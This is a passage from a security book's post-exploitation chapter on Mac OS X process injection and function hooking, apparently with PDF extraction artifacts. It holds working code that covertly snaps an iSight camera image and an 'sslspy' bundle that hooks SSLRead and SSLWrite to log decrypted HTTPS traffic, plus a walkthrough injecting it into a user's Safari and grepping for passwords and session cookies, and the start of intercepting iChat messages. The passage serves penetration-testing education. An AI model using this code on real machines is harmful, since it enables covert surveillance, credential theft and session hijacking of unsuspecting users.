CSGCameraDelegate *delegate = [[CSGCameraDelegate alloc] init];
[delegate setDataRef:picture];
CSGCamera *camera = [[CSGCamera alloc] init];
[camera setDelegate:delegate];
[camera startWithSize:NSMakeSize(640, 480)];
/*
* Create a new run loop to give the camera a chance to run. One
* second is long enough.
*/
[[NSRunLoop currentRunLoop]
runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1]];
/*
* Write out picture to to /tmp/isight.jpg
*/
int fd;
size_t len;
9955336633cc1111..iinndddd 331133 11//2255//0099 44::4433::0033 PPMM
314 Part IV ■ Post-Exploitation
if ((fd = open(“/tmp/isight.jpg”, O_WRONLY|O_CREAT|O_TRUNC, 0644)) <
0) {
return;
}
write(fd, CFDataGetBytePtr(picture), CFDataGetLength(picture));
close(fd);
[pool release];
}
The full code for the isight bundle can be found in src/lib/bundles/isight/ in
this book’s source-code package. It can be compiled and tested as shown here:
% cd src/lib/bundles/isight/
% make
gcc -c -o CSGCamera.o CSGCamera.m
…
gcc -c -o CSGImage.o CSGImage.m
gcc -c -o main.o main.m
gcc -o isight CSGCamera.o CSGImage.o main.o -bundle -framework Cocoa
-framework CoreAudioKit -framework Foundation -framework QuartzCore
-framework QuickTime -framework QuartzCore
% ../../../bin/inject-bundle isight
% open /tmp/isight.jpg
Function Hooking
Injecting new code into an existing process is very useful. Sometimes, however,
you’d also like to modify the behavior of that process. One way to do that is by
hooking existing functions and overriding their behavior. Our hooks can imple-
ment their own functionality before, after, or instead of calling the original
“real” function.
Jonathan “Wolf” Rentzsch’s mach_star (http://rentzsch.com/mach_star/)
includes a function called mach_override() that patches a target function’s
machine code to jump to a small bit of dynamically allocated executable code.
This fragment calls a newly supplied hook function instead. In the process of
overriding a target function, the caller can supply a target pointer to hold the
address of an island function. The island function is another small bit of dynami-
cally allocated executable code to re-execute any instructions overwritten in the
original function and call it to proceed to execute the rest of the function. This
allows the hook function (or any other code in the dynamically injected bundle)
to call the real function at any time. In practice this lets the hooks call the real
function before or after implementing their own functionality. This behavior is
depicted in Figure 11-2.
9955336633cc1111..iinndddd 331144 11//2255//0099 44::4433::0033 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 315
SSLRad
Hook
jmp B
jmpA
Caller SSLRead
SSLRead
Island
jmp C
Figure 11-2: Function hooking
Example: SSLSpy
The next example injectable bundle, sslspy, will use function hooking to capture
and log data sent through the Secure Transport SSL API, which is also used
transparently by the CFNetwork and NSNetwork APIs for HTTPS URLs. Many
applications on Mac OS X, including Safari, iChat, and Software Update, use
these APIs for their SSL communication.
This is a useful technique for both penetration testing and security testing.
In penetration testing, you can use this to capture credentials from a com-
promised host that may yield access to more systems. In security testing, this
technique allows the tester to observe “secure” traffi c so that they may write
fuzz tests against the server or client. While DTrace could also be used for this,
the function-hooking technique is more fl exible, letting you write logic in C
and even modify the SSL traffi c.
This bundle uses mach_override() to install hooks on several Secure Transport
functions: SSLHandshake(), SSLClose(), SSLRead(), and SSLWrite(). The follow-
ing example shows the bundle-initialization function, which installs hooks for
these functions. The calls to mach_override() also save a function pointer that
you can use to call the “real” versions of these functions. You use these “real”
function pointers in the hooks.
/*
* On initialization, hook all of the SSL functions that we are
* interested in: SSLHandshake, SSLClose, SSLRead, and SSLWrite.
*
* Note that this bundle *cannot* be unloaded because there is no
* mach_unoverride!
*/
static void sslspy_init(void) __attribute__ ((constructor));
void sslspy_init(void)
{
mach_error_t me;
9955336633cc1111..iinndddd 331155 11//2255//0099 44::4433::0033 PPMM
316 Part IV ■ Post-Exploitation
_uid = getuid();
_pid = getpid();
_output_logs = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
_input_logs = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
if ((me = mach_override(“_SSLHandshake”, “Security”,
(void*)&_hook_SSLHandshake,
(void**)&_real_SSLHandshake))) {
warnx(“mach_override: %s (0x%x)”, mach_error_string(me), me);
}
if ((me = mach_override(“_SSLClose”, “Security”,
(void*)&_hook_SSLClose,
(void**)&_real_SSLClose))) {
warnx(“mach_override: %s (0x%x)”, mach_error_string(me), me);
}
if ((me = mach_override(“_SSLWrite”, “Security”,
(void*)&_hook_SSLWrite,
(void**)&_real_SSLWrite))) {
warnx(“mach_override: %s (0x%x)”, mach_error_string(me), me);
}
if ((me = mach_override(“_SSLRead”, “Security”,
(void*)&_hook_SSLRead,
(void**)&_real_SSLRead))) {
warnx(“mach_override: %s (0x%x)”, mach_error_string(me), me);
}
}
An application calls SSLHandshake() to perform an SSL protocol negotiation
on an established TCP connection. After it fi nishes, the SSLContext structure is
fully initialized. The hook for SSLHandshake() calls the real SSLHandshake()
and then opens log fi les for data written to and read from that SSL stream. SSL
traffi c is logged into fi les rooted in /tmp/sslspy, but stored within further sub-
directories based on the user ID, process ID, SSL peer hostname, SSLContext
unique identifi er, and direction of traffi c. The log fi les for open SSL connections
are stored in a CFMutableDictionary keyed by the SSLContextRef pointer. For
example, /tmp/sslspy/502/49418/gmail.com/0x9c4e00/out is the fi lename of
an outbound capture of SSL traffi c to gmail.com. The hook for SSLHandshake()
is somewhat lengthy, so if you’d like to see it, please refer to the full source for
sslspy.c in this book’s source-code package.
SSLClose() terminates an SSL connection and the hook for it closes the asso-
ciated log fi les. The hooks for SSLRead() and SSLWrite() call the real functions
and then log the transmitted data to the appropriate log fi les. The hooks for
SSLRead() and SSLWrite() are as follows:
9955336633cc1111..iinndddd 331166 11//2255//0099 44::4433::0033 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 317
/*
* SSLRead hook: Log read data into input log file
*/
static OSStatus
(*_real_SSLRead)(SSLContextRef, void*, size_t, size_t*) = 0;
static OSStatus
_hook_SSLRead(SSLContextRef ctx, void *data, size_t dataLength,
size_t *processed)
{
OSStatus status;
int fd;
status = (*_real_SSLRead)(ctx, data, dataLength, processed);
fd = (int)CFDictionaryGetValue(_input_logs, (void*)ctx);
write(fd, data, *processed);
return status;
}
/*
* SSLWrite hook: Log written data into output log file
*/
static OSStatus
(*_real_SSLWrite)(SSLContextRef, const void *, size_t, size_t *) = 0;
static OSStatus
_hook_SSLWrite(SSLContextRef ctx, const void *data, size_t dataLength,
size_t *bytesWritten)
{
OSStatus status;
int fd;
status = (*_real_SSLWrite)(ctx, data, dataLength, bytesWritten);
fd = (int)CFDictionaryGetValue(_output_logs, (void*)ctx);
write(fd, data, *bytesWritten);
return status;
}
As an example, we will show how to use the sslspy bundle to capture sensi-
tive data being sent over SSL by the Safari web browser. First you need to fi nd
the process ID of the running Safari and inject the bundle into it.
bash-3.2# ps -aef | grep Safari
502 50067 137 0 0:00.08 ?? 0:00.28
/Applications/Safari.app/Contents/MacOS/Safari -psn_0_10758722
0 50106 50072 0 0:00.00 ttys001 0:00.00 grep Safari
bash-3.2# ./bin/inject-bundle ./lib/bundles/sslspy/sslspy 50067
9955336633cc1111..iinndddd 331177 11//2255//0099 44::4433::0033 PPMM
318 Part IV ■ Post-Exploitation
Now you wait while the user surfs the Web a little bit. As the user surfs, you
can search the sslspy logs for anything interesting. You would probably be
interested in website passwords or secure-session cookies, and you can easily
fi nd these with grep:
bash-3.2# grep -aRi “passwd” /tmp/sslspy/502/50067/
/tmp/sslspy/502/50067/www.google.com/0x980200/
out:continue=http%3A%2F%2Fwww.google.com%2F&hl=en&Email=Dino.DaiZovi&Pas
swd=XXXXXXXX&PersistentCookie=yes&rmShown=1&signIn=Sign+in&asts=
bash-3.2# grep -aR “Set-Cookie” /tmp/sslspy/502/50067/
/tmp/sslspy/502/50067/twitter.com/0x9f8c00/in:Set-Cookie: _twitter_
sess=ABj3EzoEA8A5g1nifjAflzuerheA929fjNGlYAWvHaH12wf8ADOnHia1N0Oa%25
0B0HA8NdA9lNArysi91fjaksjfIFHsfls083hKJfjahrh298jsKhfFAFajJIHdfnfnFJ
ru982jFmfks7Jfnf9fuJFjfn2k0832Sfj1jfJFUNRju9NfkJ29fjJqhfyJF%250Ajfka
9j1jFkaj89fh12hnanjvcFjfhHFjjFJfffjf2h7Ajfnbjg9821hfjbj%250Bi18rjZjfjgh
rjf%253D%253D-- a6e7a8f986134c74a57832f18420fb10; domain=.twitter.com;
path=/
Since HTTP is a plain-text protocol, you can also easily examine raw HTTP
requests from the logged output. The following is an example HTTP request:
GET /twitter_production/profile_images/58409867/manga_dan_normal.png
HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; en-us)
AppleWebKit
/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1
Referer: https://twitter.com/home
Accept: */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Cookie: __utma=225501720.1947162746.1209105764.1209105764.1209105764.1;
__utmz=2
25501720.1209105764.1.1.utmccn=(direct)|utmcsr=(direct)|utmcmd=(none)
Connection: keep-alive
Host: s3.amazonaws.com
Objective-C Method Swizzling
The function-hooking technique demonstrated in the preceding section is quite
useful for low-level processes written in C or C++. Real Mac OS X applications
are more commonly written in Objective-C, however. The hooking technique
is much less useful when every method call goes through the same function
(objc_msgSend). Luckily, you can easily intercept method calls using a technique
called method swizzling.
9955336633cc1111..iinndddd 331188 11//2255//0099 44::4433::0033 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 319
First you need to fi nd some interesting methods to swizzle. Objective-C bina-
ries contain much of their class structure in a high-level form. This makes them
easy to reverse-engineer in IDA Pro. It may often be easier than that, however.
A command-line tool called class-dump can be used to dump out the
Objective-C class defi nitions from a given executable in recompilable Objective-C
syntax. You can use this tool to browse through the class and method names
looking for something interesting. Once you have found a potentially interesting
method, you can break on it in the debugger to observe when it is called and
with what arguments. You can do this even if the binary does not have symbols,
as described in Apple’s aptly named Technical Note 2124: Mac OS X Debugging
Magic (http://developer.apple.com/technotes/tn2004/tn”2124”.html).
For the next example, assume that the target is iChat and that you are inter-
ested in capturing IMs sent and received through it. If you run class-dump on
the iChat binary, you will notice a few interesting methods.
% class-dump /Applications/iChat.app/Contents/MacOS/iChat | grep -i
message
- (int)sendMessage:(id)fp8 toChatID:(id)fp12;
…
- (oneway void)chat:(id)fp8 messageReceived:(id)fp12;
Further examination of the full class-dump output reveals that those methods
belong to the Service class.
Now you can attempt to use GDB to set a breakpoint on one of those
methods.
%gdb /Applications/iChat.app/Contents/MacOS/iChat
GNU gdb 6.3.50-20050815 (Apple version gdb-956) (Wed Apr 30 05:08:47 UTC
2008)
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are
welcome to change it and/or distribute copies of it under certain
conditions.
Type “show copying” to see the conditions.
There is absolutely no warranty for GDB. Type “show warranty” for
details.
This GDB was configured as “i386-apple-darwin”...Reading symbols for
shared libraries .................................................. done
(gdb) break -[Service sendMessage:toChatID:]
Function “-[Service sendMessage:toChatID:]” not defined.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb)
Because the symbols were stripped from the binary, GDB is unable to locate
the code for that method. Luckily, you can use some debugging magic to fi nd
it ourselves.
9955336633cc1111..iinndddd 331199 11//2255//0099 44::4433::0044 PPMM
320 Part IV ■ Post-Exploitation
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /Applications/iChat.app/Contents/MacOS/iChat
Reading symbols for shared libraries
+++++++++++++++++++++++++++++++++++++++++++++++++.......................
......................................................... done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries .. done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries .. done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries .. done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
^C
Program received signal SIGINT, Interrupt.
0x916f94a6 in mach_msg_trap ()
(gdb) call (void*)objc_getClass(“Service”)